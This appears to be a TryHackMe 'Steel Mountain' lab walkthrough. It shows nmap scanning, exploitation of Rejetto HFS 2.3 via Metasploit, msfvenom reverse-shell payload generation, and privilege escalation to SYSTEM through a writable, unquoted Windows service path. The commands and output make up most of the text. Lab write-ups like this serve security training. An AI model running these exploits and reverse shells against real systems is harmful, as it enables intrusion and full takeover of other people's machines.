---
URL: https://tryhackme.com/r/room/steelmountain
Machine IP: 10.10.82.184
---
## Initial Port Scan

We will first run a namp scan on the machine to figure out the opened ports and save it under `nmap/initial`.

```bash
$ nmap -sC -sV -vv -oN nmap/initial 10.10.82.184
```

From the nmap result below, we can see that 13 ports are up. There are few interesting ports such as two web servers on ports `80` and `8080`.

```bash
# Nmap 7.94SVN scan initiated Fri Apr 19 18:28:25 2024 as: nmap -sC -sV -vv -oN nmap/initial 10.10.82.184
Increasing send delay for 10.10.82.184 from 0 to 5 due to 30 out of 98 dropped probes since last increase.
Nmap scan report for 10.10.82.184
Host is up, received syn-ack (0.28s latency).
Scanned at 2024-04-19 18:28:26 AEST for 138s
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn\'t have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
|_ssl-date: 2024-04-19T08:30:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-04-18T08:12:24
| Not valid after:  2024-10-18T08:12:24
| MD5:   91ea:88de:405e:01f7:f3e3:ad2b:027e:2fa5
| SHA-1: 8edf:e009:9759:90fe:d908:91b7:919c:50da:97bf:d3d7
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQaNx1bEf4LrZAtaR0sn7JfzANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDQxODA4MTIyNFoXDTI0MTAx
| ODA4MTIyNFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBANvYsO1kcEFit6whpLjkir9IZd/HI5HicBFUtETH
| aQBCj2xd4TU9oJoz3qiJdWmCoTe0xz8avJFaljqpsy74HvSRnOgt+vFpwOZemC1V
| FBrKzmmDSCWaTqFYEjHv2SlOyU5dGMJJrfNwQGLE0NMtHCbeEcw//CNxQ+IKAoU2
| D3VXM5bcyjkTxEQh+mJhZ/ryI6PEBpmqdY7+YKzpqbC9Be1nAJKkPaE7UA74Tthq
| pPQl1khK4yvw+cO1uAyU4QOzVMCmY8jidYm97Lc0UUnZCqKcZXTQMtDCVFashpk9
| bHbI7sEbgLTXBc/HjC4pJDo1ntOGycUwIvAFdXev80wCpLECAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQC1EahgJB0DIdgcJALNfbYasBE2X4LLGgu4QMrl1erW8UHL74JtGvxqJDK7NnDH
| MiD7D2S61cR2We4gjtKBTGU0woZ+WhTXTIL4om5Q/cvs3AgSXpP753AMPbcyYpxU
| jmyobJx8WdJKYxZsVClqp+Hkr1wgPLVtSJhGpurOwVDPi6fRsxGrbvo9hnK1p9m6
| YmvTF218/XVPoYly5k7SJOOFvC2Tm7lMTdYtvVhl2B621X6aAkq8heHBiBQCOUFW
| O43ehFMzMZJTcvcb/4u+WyS3hv3JPU1ZxdhniDqOdt+wVadk+/BzrggY3Fx7vX12
| agnXcPYO8zMvE9yLoRrWtBJj
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-04-19T08:30:36+00:00
8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
49175/tcp open  msrpc              syn-ack Microsoft Windows RPC
49176/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:92:e1:4f:d7:d1 (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02:92:e1:4f:d7:d1:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2024-04-19T08:30:37
|_  start_date: 2024-04-19T08:11:39
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44541/tcp): CLEAN (Couldn\'t connect)
|   Check 2 (port 9350/tcp): CLEAN (Couldn\'t connect)
|   Check 3 (port 38926/udp): CLEAN (Failed to receive data)
|   Check 4 (port 59570/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 19 18:30:44 2024 -- 1 IP address (1 host up) scanned in 138.50 seconds
```

## Webservers

Since we see there is a webserver running on port 80 of the machine, we can visit it via a web browser. By viewing the source of the page, we see that the image under employee of the month is named as `BillHarper`.

```HTML
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Steel Mountain</title>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center>
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
</center>
</body>
</html>
```

In addition to this, there's another webserver running on port `8080`. After visiting this port, we notice that it is running the `rejetto HTTP File Server 2.3`. 

A quick google search reveals that there is a [RCE vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) present in this version under `CVE-2014-6287`. We can use metasploit to exploit this and gain access to the server.

## Exploiting Rejetto HFS

Searching for modules under Rejetto in Metasploit, provides us the following result.

```bash
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
```

After loading the model, we can look for which options we should set.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > show options 

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.139.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

We need to set `RHOST, RPOSRT,` and the `LHOST` options before running the exploit with the default payload.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.82.184
RHOSTS => 10.10.82.184
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.4.72.115
LHOST => 10.4.72.115
```

After the options are set, we can run the exploit to get an initial connection with the meterpreter shell.

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Using URL: http://10.4.72.115:8080/SJ8v8G0BCsN
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /SJ8v8G0BCsN
[*] Sending stage (176198 bytes) to 10.10.82.184
[!] Tried to delete %TEMP%\nuvYzIBc.vbs, unknown result
[*] Meterpreter session 1 opened (10.4.72.115:4444 -> 10.10.82.184:49226) at 2024-04-19 18:33:55 +1000
[*] Server stopped.

meterpreter >
```

## PrivEsc

To escalate our privileges from a user account to an admin account, we can enumerate the machine to detect any abnormal services running with elevated privileges. The [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) script can be used to detect such abnormalities.

```bash
$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
$ ls
PowerUp.ps1  nmap
meterpreter > upload PowerUp.ps1
```

To run the `PowerUp.ps1` script, we should be inside a powershell instance. We can load powershell to meterpreter by typing `load powershell` and enter it using the command `powershell_shell`.

```bash
meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > 
```

Once we have the powershell instance, we can execute the `PowerUp.ps1` file we uploaded to the machine.

```Powershell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

From the above output, we see there is a service with the `CanRestart` option set to True. Furthermore, since the path is not quoted, we can create a file name `Advanced.exe` and save it in the `C:\Program Files (x86)\IObit\` directory. However, this can also be exploited by simply replacing the `ASCService.exe` file since file permissions are misconfigured.

We can use `msfvenom` to generate a meterpreter reverse_shell and save it as `Advanced.exe`. Since the file is executed as `localsystem`, we can get a reverse connection with a reverse shell as them.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.72.115 LPORT=9999 -e x86/shikata_ga_nai -f exe > Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
```

We can now upload it to the remote machine and save it in the `IObit` directory. (We need to stop the `AdvancedSystemCareService9` service before replacing the file.)

```shell
meterpreter > upload Advanced.exe
meterpreter > ls
Listing: C:\Program Files (x86)\IObit
=====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  32768  dir   2024-04-19 18:13:25 +1000  Advanced SystemCare
100777/rwxrwxrwx  73802  fil   2024-04-19 19:53:46 +1000  Advanced.exe
040777/rwxrwxrwx  0      dir   2019-09-27 15:35:24 +1000  IObit Uninstaller
040777/rwxrwxrwx  4096   dir   2019-09-27 01:18:50 +1000  LiveUpdate
100666/rw-rw-rw-  28     fil   2024-04-19 19:22:37 +1000  start
100666/rw-rw-rw-  28     fil   2024-04-19 19:22:26 +1000  stop
```

Before restarting the service, we need to create a handler in Metasploit to catch the reverse connection.

```shell
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.4.72.115
LHOST => 10.4.72.115
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.72.115:9999 
```

Once the handler is run, we can restart the service on the Windows Machine. However, since we have replaced the service executable, when the reverse shell is created the service will hang. Windows will detect this and terminate the service after few seconds. Hence, we need to make sure we **migrate to another service quickly** as we get the reverse connection!
#### Without Migration

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.72.115:6666 
[*] Sending stage (176198 bytes) to 10.10.82.184
[*] Meterpreter session 4 opened (10.4.72.115:6666 -> 10.10.82.184:49327) at 2024-04-19 19:52:28 +1000

meterpreter > 
[*] 10.10.82.184 - Meterpreter session 4 closed.  Reason: Died
```

```powershell
C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

#### With Migration

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.4.72.115:9999 
[*] Sending stage (176198 bytes) to 10.10.82.184
[*] Meterpreter session 13 opened (10.4.72.115:9999 -> 10.10.82.184:49345) at 2024-04-19 20:07:07 +1000

meterpreter > run post/windows/manage/migrate

[*] Running module against STEELMOUNTAIN
[*] Current server process: Advanced.exe (2576)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 76
[+] Successfully migrated into process 76
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We have now gained system privileges. 